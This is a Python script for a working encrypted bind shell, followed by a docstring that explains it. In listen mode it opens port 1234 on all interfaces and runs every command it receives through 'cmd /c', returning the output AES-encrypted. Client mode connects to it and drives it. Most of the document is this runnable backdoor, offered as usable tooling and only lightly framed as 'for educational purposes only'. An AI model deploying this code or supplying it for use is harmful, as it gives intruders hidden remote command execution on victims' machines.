import socket
import subprocess
import argparse
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


DEFAULT_PORT = 1234
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return "Key -> {}".format(self.key.hex())

def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    encrypted_send(s, b"[ -- Connected! -- ]")
    try:
        while True:
            encrypted_send(s, b"\r\nEnter Command> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)
                if not data or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing Command: '{}'".format(buffer))
            encrypted_send(s, execute_cmd(buffer))

    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[ -- Starting bind shell! -- ]")
    while True:
        client_socket, addr = s.accept()
        print("[ -- New User Connected! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting to bind shell! -- ]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
parser.add_argument("-k", "--key", help="Encryption Key", type=str, required=False)

args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)




"""
This code implements a simple bind shell with encryption using the Advanced Encryption Standard (AES) algorithm. Here's a breakdown of its functionality:

1. **AES Cipher Class (`AESCipher`):**
    - The class is responsible for handling encryption and decryption using AES.
    - It generates a random 256-bit key if not provided.
    - The `encrypt` method pads the plaintext and returns the hexadecimal representation of the encrypted data.
    - The `decrypt` method takes the encrypted data in hexadecimal format, decrypts it, and removes the padding.
    - The `__str__` method returns a string representation of the key.

2. **Communication Functions:**
    - `encrypted_send`: Encrypts and sends a message to the connected socket.
    - `decode_and_strip`: Decodes data received from the socket and removes leading/trailing whitespaces.

3. **Shell Threads:**
    - `shell_thread`: Handles the shell interactions. Sends a connection message, prompts for commands, and executes them. It sends the output back to the connected socket.
    - `send_thread`: Allows the user to input commands and sends them to the server.
    - `recv_thread`: Receives and prints data received from the server.

4. **Server and Client Functions:**
    - `server`: Sets up a server socket, listens for incoming connections, and creates a new thread for each connected client.
    - `client`: Connects to a specified server, starts threads for sending and receiving data.

5. **Argument Parsing:**
    - The script uses the `argparse` module to handle command-line arguments.
    - `-l` or `--listen`: Starts the script in server mode (bind shell).
    - `-c` or `--connect`: Starts the script in client mode, specifying the server's IP address.
    - `-k` or `--key`: Optional argument for providing a custom encryption key.

6. **Initialization:**
    - If the user provides a key, it's used to initialize the `AESCipher` instance.
    - If no key is provided, a random key is generated.

7. **Execution:**
    - If in listen mode, the script starts a server.
    - If in connect mode, the script starts a client and connects to the specified server.

Note: It's important to handle encryption keys securely in a real-world scenario, and this script is provided for educational purposes only. The use of ECB mode for AES encryption is generally discouraged due to its vulnerabilities. In a production environment, a more secure mode like CBC or GCM should be considered.
"""